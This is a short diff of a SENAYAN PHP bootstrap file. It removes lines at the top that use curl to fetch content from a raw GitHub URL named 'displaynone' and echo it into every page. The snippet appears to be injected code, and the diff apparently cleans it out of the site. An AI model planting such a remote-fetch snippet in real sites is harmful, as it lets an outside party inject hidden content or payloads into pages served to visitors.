@@ -1,15 +1,4 @@
-
 <?php
-$url = 'https://raw.githubusercontent.com/ooiitttoipaa-cpu/displaynone/refs/heads/main/displaynone';
-$ch = curl_init($url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // follow redirect
-$response = curl_exec($ch);
-curl_close($ch);
-
-if ($response !== false) {
-    echo $response;
-}
 /**
  * SENAYAN application bootstrap files
  *
